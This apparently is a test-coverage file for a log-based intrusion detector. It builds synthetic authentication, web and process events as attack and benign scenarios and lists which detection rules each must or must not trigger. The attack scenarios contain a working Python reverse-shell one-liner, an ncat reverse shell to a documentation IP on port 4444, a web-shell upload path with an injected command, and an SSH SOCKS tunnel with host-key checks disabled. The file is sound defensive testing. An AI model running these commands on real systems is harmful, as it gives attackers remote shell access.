import sys
import time
from pathlib import Path
from typing import List

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.normalize import NormalizedEvent

from tests.coverage.credential_access_helper import CoverageScenario


def _auth_evt(ts, *, user="alice", host="c2-host", source="auth.log", distro_family="unknown"):
    return NormalizedEvent(
        ts=ts,
        host=host,
        src_ip="203.0.113.10",
        source=source,
        category="auth",
        action="ssh_login",
        outcome="success",
        user=user,
        message="ssh_login:success",
        fields={},
        distro_family=distro_family,
    )


def _web_evt(ts, path, *, host="c2-host", source="nginx", distro_family="unknown"):
    return NormalizedEvent(
        ts=ts,
        host=host,
        src_ip="203.0.113.200",
        source=source,
        category="web_attack",
        action="shell_upload",
        outcome="success",
        message=path,
        fields={
            "attack": "shell_upload",
            "method": "POST",
            "path": path,
            "path_lc": path.lower(),
            "path_decoded": path,
            "path_decoded_lc": path.lower(),
            "status": 200,
            "ua": "Mozilla/5.0",
            "ua_lc": "mozilla/5.0",
        },
        distro_family=distro_family,
    )


def _proc_evt(ts, cmdline, *, host="c2-host", user="alice", process=None, source="journald", distro_family="unknown"):
    return NormalizedEvent(
        ts=ts,
        host=host,
        source=source,
        category="process",
        action="process_exec",
        outcome="success",
        user=user,
        process=process or cmdline.split()[0],
        message=cmdline,
        fields={"cmdline": cmdline},
        distro_family=distro_family,
    )


def build_attack_scenarios() -> List[CoverageScenario]:
    now = time.time()
    return [
        CoverageScenario(
            name="debian-login-python-reverse-shell",
            events=[
                _auth_evt(now + 1, host="c2-attack-01", user="alice", source="auth.log", distro_family="debian"),
                _proc_evt(now + 16, "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"203.0.113.50\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'", host="c2-attack-01", process="python3", source="journald", distro_family="debian"),
            ],
            expected_ids={"PROC-C2-001", "SEQ-061"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="rhel-httpd-web-abuse-then-ncat",
            events=[
                _web_evt(now + 2, "/uploads/shell.php.jpg?cmd=%60id%60", host="c2-attack-02", source="apache2", distro_family="rhel"),
                _proc_evt(now + 17, "ncat 203.0.113.77 4444 -c /bin/sh", host="c2-attack-02", user="apache", process="ncat", source="auditd", distro_family="rhel"),
            ],
            expected_ids={"PROC-C2-001", "SEQ-062"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="suse-login-ssh-dynamic-forward",
            events=[
                _auth_evt(now + 3, host="c2-attack-03", user="root", source="auth.log", distro_family="suse"),
                _proc_evt(now + 18, "ssh -Nf -D 1080 -o StrictHostKeyChecking=no ops@198.51.100.10", host="c2-attack-03", user="root", process="ssh", source="syslog", distro_family="suse"),
            ],
            expected_ids={"PROC-C2-002", "SEQ-061"},
            forbidden_ids=set(),
            kind="attack",
        ),
    ]


def build_benign_scenarios() -> List[CoverageScenario]:
    now = time.time()
    return [
        CoverageScenario(
            name="debian-local-db-forward",
            events=[
                _auth_evt(now + 101, host="c2-benign-01", user="root", source="auth.log", distro_family="debian"),
                _proc_evt(now + 116, "ssh -N -L 5432:127.0.0.1:5432 admin@bastion", host="c2-benign-01", user="root", process="ssh", source="journald", distro_family="debian"),
            ],
            expected_ids=set(),
            forbidden_ids={"PROC-C2-002", "SEQ-061"},
            kind="benign",
        ),
        CoverageScenario(
            name="rhel-httpd-server-status-healthcheck",
            events=[
                _web_evt(now + 102, "/server-status?auto", host="c2-benign-02", source="apache2", distro_family="rhel"),
                _proc_evt(now + 117, "curl -fsS http://127.0.0.1/healthz", host="c2-benign-02", user="apache", process="curl", source="auditd", distro_family="rhel"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-062"},
            kind="benign",
        ),
        CoverageScenario(
            name="suse-kube-system-printenv",
            events=[
                _proc_evt(now + 103, "kubectl exec -n kube-system metrics-server -- /bin/true", host="c2-benign-03", user="root", process="kubectl", source="syslog", distro_family="suse"),
                _proc_evt(now + 118, "curl -fsS http://127.0.0.1/healthz", host="c2-benign-03", user="root", process="curl", source="syslog", distro_family="suse"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-062"},
            kind="benign",
        ),
        CoverageScenario(
            name="debian-socat-local-forward",
            events=[
                _proc_evt(now + 104, "socat TCP-LISTEN:9443,fork TCP-CONNECT:127.0.0.1:443", host="c2-benign-04", user="root", process="socat", source="journald", distro_family="debian"),
            ],
            expected_ids=set(),
            forbidden_ids={"PROC-C2-001", "SEQ-061"},
            kind="benign",
        ),
    ]
